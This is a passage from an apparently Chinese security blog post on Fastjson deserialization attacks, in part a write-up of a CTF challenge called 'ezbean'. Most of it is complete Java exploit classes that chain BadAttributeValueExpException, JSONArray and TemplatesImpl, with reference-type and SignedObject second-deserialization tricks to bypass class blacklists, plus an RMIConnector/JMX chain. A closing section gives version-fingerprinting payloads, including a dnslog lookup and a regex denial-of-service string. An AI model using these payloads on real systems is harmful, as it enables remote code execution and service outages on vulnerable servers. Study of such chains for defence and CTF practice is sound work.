class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">baos</span>)</span>;        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">o</span>)</span>;        oos.close<span class="hljs-literal">()</span>;         String base64String = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        return base64String;     &#125;     public static void deserial(String data) throws Exception &#123;        byte<span class="hljs-literal">[]</span> base64decodedBytes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(data);        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">base64decodedBytes</span>)</span>;        CustomObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CustomObjectInputStream(<span class="hljs-params">bais</span>)</span>;        ois.read<span class="hljs-constructor">Object()</span>;        ois.close<span class="hljs-literal">()</span>;    &#125;     public static void set<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">name</span>, Object <span class="hljs-params">value</span>)</span> throws Exception&#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;&#125;</code></pre></div><h2 id="在没有过滤的情况下，可以用BadAttributeValueExpException触发toString"><a href="#在没有过滤的情况下，可以用BadAttributeValueExpException触发toString" class="headerlink" title="在没有过滤的情况下，可以用BadAttributeValueExpException触发toString"></a>在没有过滤的情况下，可以用BadAttributeValueExpException触发toString</h2><div class="code-wrapper"><pre><code class="hljs reasonml">#BadAttriubutexxxx的toString触发fastjson#toStringimport com.alibaba.fastjson.JSONObject;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import org.springframework.aop.target.HotSwappableTargetSource;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public <span class="hljs-keyword">class</span> exp &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;        byte<span class="hljs-literal">[]</span> bytecodes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\22927\\Downloads\\fastjson_tostring\\target\\classes\\com\\example\\fastjson_tostring\\evilclass.class&quot;</span>)</span>);        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);        JSONObject jo = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JSONObject()</span>;        jo.put(<span class="hljs-string">&quot;1&quot;</span>,templatesimpl);        BadAttributeValueExpException exp = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(1)</span>;        Field <span class="hljs-keyword">val</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;        <span class="hljs-keyword">val</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        <span class="hljs-keyword">val</span>.set(exp,jo);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(serial(exp));    &#125;    public static String serial(Object o) throws IOException &#123;        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">baos</span>)</span>;        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">o</span>)</span>;        oos.close<span class="hljs-literal">()</span>;        String base64String = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        return base64String;    &#125;    public static void deserial(String data) throws Exception &#123;        byte<span class="hljs-literal">[]</span> base64decodedBytes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(data);        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">base64decodedBytes</span>)</span>;        CustomObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CustomObjectInputStream(<span class="hljs-params">bais</span>)</span>;        ois.read<span class="hljs-constructor">Object()</span>;        ois.close<span class="hljs-literal">()</span>;    &#125;    public static void set<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">name</span>, Object <span class="hljs-params">value</span>)</span> throws Exception&#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;&#125;</code></pre></div><p><a href="https://xz.aliyun.com/t/12606">FastJson结合二次反序列化绕过黑名单 - 先知社区 (aliyun.com)</a></p><h2 id="通过ezbean看fastjson链"><a href="#通过ezbean看fastjson链" class="headerlink" title="通过ezbean看fastjson链"></a>通过ezbean看fastjson链</h2><div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>[] blacklist <span class="hljs-operator">=</span> new <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;java<span class="hljs-subst">\\</span>.security.*&quot;</span>, <span class="hljs-string">&quot;java<span class="hljs-subst">\\</span>.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com<span class="hljs-subst">\\</span>.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com<span class="hljs-subst">\\</span>.ctf<span class="hljs-subst">\\</span>.*&quot;</span>,<span class="hljs-string">&quot;org<span class="hljs-subst">\\</span>.springframework.*&quot;</span>, <span class="hljs-string">&quot;org<span class="hljs-subst">\\</span>.yaml.*&quot;</span>,<span class="hljs-string">&quot;javax<span class="hljs-subst">\\</span>.management<span class="hljs-subst">\\</span>.remote.*&quot;</span>&#125;;</code></pre></div><h3 id="非预期（原生反序列化2）-全版本引用类型绕过"><a href="#非预期（原生反序列化2）-全版本引用类型绕过" class="headerlink" title="非预期（原生反序列化2） 全版本引用类型绕过"></a>非预期（原生反序列化2） 全版本引用类型绕过</h3><p><code>fastjson 1.2.49</code>开始，<code>JSONArray</code>和<code>JSONObject</code>开始重写了<code>resolveClass</code>，过滤了诸如<code>TemplatesImpl</code>的危险类。而<code>ezbean</code>那道题使用了一个自定义的不安全的<code>ObjectInputStream</code>进行反序列化</p><p>所以能通过<strong>引用</strong>的数据类型(放入list)，从而不执行<code>resolveClass</code></p><p>向<code>List、set、map</code>类型中添加同样对象时即可成功利用，以<code>list</code>为例</p><div class="code-wrapper"><pre><code class="hljs abnf">ArrayList&lt;Object&gt; arrayList <span class="hljs-operator">=</span> new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>arrayList.add(templates)<span class="hljs-comment">;</span>arrayList.add(templates)<span class="hljs-comment">;</span>writeObjects(arrayList)<span class="hljs-comment">;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fj;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bad_gadget</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        ArrayList&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>));        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());                <span class="hljs-comment">//为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span>        list.add(templatesimpl);        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();        <span class="hljs-comment">//此时在hash表中查到了映射，因此接下来以引用形式输出</span>        jo.add(templatesimpl);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);        val.setAccessible(<span class="hljs-literal">true</span>);        val.set(exp,jo);        list.add(exp);        System.out.println(serial(list));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;&#125;</code></pre></div><h4 id="存在的不足"><a href="#存在的不足" class="headerlink" title="存在的不足"></a>存在的不足</h4><p>如果重写的<code>ObjectInputStream</code>过滤<code>templates</code>，这样的方法就失效了。</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> final List&lt;Object&gt; BLACKLIST = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">as</span><span class="hljs-constructor">List(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>, <span class="hljs-string">&quot;com.sun.syndication.feed.impl.ObjectBean&quot;</span>, <span class="hljs-string">&quot;import com.sun.syndication.feed.impl.ToStringBean&quot;</span>)</span>;</code></pre></div><h4 id="解决方法-（二次反序列化）"><a href="#解决方法-（二次反序列化）" class="headerlink" title="解决方法 （二次反序列化）"></a>解决方法 （二次反序列化）</h4><p>二次反序列化条件：<strong>触发SignedObject#getObject</strong></p><p><code>JsonObject#toString</code>可以触发任意<code>getter</code>方法，而<code>toString</code>又可以通过<code>BadAttributeValueExpException#readObject</code>调用，因此整条链子就通了</p><div class="code-wrapper"><pre><code class="hljs coffeescript">* 绕过第一次的TemplatesImpl黑名单检查    BadAttributeValueExpException<span class="hljs-comment">#readObject</span>    JSONOBJECT<span class="hljs-comment">#toString</span>    SignedObject<span class="hljs-comment">#getObject</span>* 二次反序列化    * 引用绕过<span class="hljs-built_in">JSON</span>自带resolveClass的黑名单检查        BadAttributeValueExpException<span class="hljs-comment">#readObject</span>        JSONArray<span class="hljs-comment">#toString</span>        TemplatesImpl<span class="hljs-comment">#getOutputProperties</span>            TemplatesImpl<span class="hljs-comment">#newTransformer</span>            TemplatesImpl<span class="hljs-comment">#getTransletInstance</span>            TemplatesImpl<span class="hljs-comment">#defineTransletClasses</span>            TemplatesImpl<span class="hljs-comment">#defineClass</span></code></pre></div><p>看完gadget思路就很清晰了</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fj;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.security.KeyPair;<span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<span class="hljs-keyword">import</span> java.security.Signature;<span class="hljs-keyword">import</span> java.security.SignedObject;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dou_rev</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        ArrayList&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>));        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        list.add(templatesimpl);        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();        jo.add(templatesimpl);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);        val.setAccessible(<span class="hljs-literal">true</span>);        val.set(exp,jo);        list.add(exp);        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);        kpg.initialize(<span class="hljs-number">1024</span>);        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>((Serializable) list, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));        <span class="hljs-comment">//触发SignedObject#getObject</span>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();        jsonArray1.add(signedObject);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);        val.set(bd1,jsonArray1);        System.out.println(serial(bd1));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;&#125;</code></pre></div><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>mybean 放在 JSONObject 当中就不会走题目自定义的 resolveClass，从而绕过黑名单</p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-keyword">private</span> JMXConnector conn;<span class="hljs-keyword">public</span> String getConnect() throws IOException &#123;      <span class="hljs-keyword">try</span> &#123;         <span class="hljs-keyword">this</span>.conn.connect();         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;      &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail&quot;</span>;      &#125;   &#125;</code></pre></div><p>可以用<code>JMXConnector</code>的<code>connect</code>方法</p><p>思路就是<code>fastjson#toString</code>后到<code>mybean</code>调用<code>getter</code>，把当中的<code>conn</code>设置为<code>RMIConnector</code></p><div class="code-wrapper"><pre><code class="hljs reasonml">JMXServiceURL jmxServiceURL = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">jmxServiceURL</span>, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span> + <span class="hljs-string">&quot;base64&quot;</span>)</span>;        RMIConnector rmiConnector = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RMIConnector(<span class="hljs-params">jmxServiceURL</span>, <span class="hljs-params">null</span>)</span>;        MyBean myBean = <span class="hljs-keyword">new</span> <span class="hljs-constructor">MyBean(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-params">rmiConnector</span>)</span>;<span class="hljs-comment">//        JSONArray jsonArray = new JSONArray();</span><span class="hljs-comment">//        jsonArray.add(myBean);</span>        JSONObject jsonObject = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JSONObject()</span>;        jsonObject.put(<span class="hljs-string">&quot;name&quot;</span>,myBean);        BadAttributeValueExpException bd= <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(<span class="hljs-params">null</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">bd</span>, <span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-params">jsonObject</span>)</span>;        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;        objectOutputStream.write<span class="hljs-constructor">Object(<span class="hljs-params">bd</span>)</span>;        <span class="hljs-comment">//获取base64的arraylist</span>        String baseStr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(baseStr);</code></pre></div><h1 id="判断版本的方法"><a href="#判断版本的方法" class="headerlink" title="判断版本的方法"></a>判断版本的方法</h1><p><a href="https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA">https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA</a></p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;pageNumber&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pageSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>加上一个不相关的键值</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;pageNumber&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pageSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>jackson就会报错，fastjson则不会，而是和之前一模一样。</p><p>比如经典的1.2.24-1.2.83都会有dnslog的payload。</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zero&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog.com&quot;</span>&#125;&#125;</code></pre></div><p>比如浅蓝发现的1.2.36-1.2.62正则DDOS。</p><p>逐步加a，直到延迟为止</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;regex&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[blue rlike &#x27;^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#x27;]&quot;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;blue&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><h2 id="有报错信息，判断版本号"><a href="#有报错信息，判断版本号" class="headerlink" title="有报错信息，判断版本号"></a>有报错信息，判断版本号</h2><div class="code-wrapper"><pre><code class="hljs stylus">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;test&quot;</span>:1]</span></code></pre></div><h2 id="无报错信息，判断版本号"><a href="#无报错信息，判断版本号" class="headerlink" title="无报错信息，判断版本号"></a>无报错信息，判断版本号</h2><p>&lt;1.2.24，没有任何限制。</p><p>1.2.24-1.2.47，java.lang.Class绕过。</p><p>1.2.48-1.2.68，java.lang.AutoCloseable绕过。</p><p>1.2.70-1.2.72，无链版本</p><p>1.2.73-1.2.80，java.lang.Exception绕过。</p><p>1.2.83，无漏洞版本</p><p>比如正常一个json传参。</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;pageNumber&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pageSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span 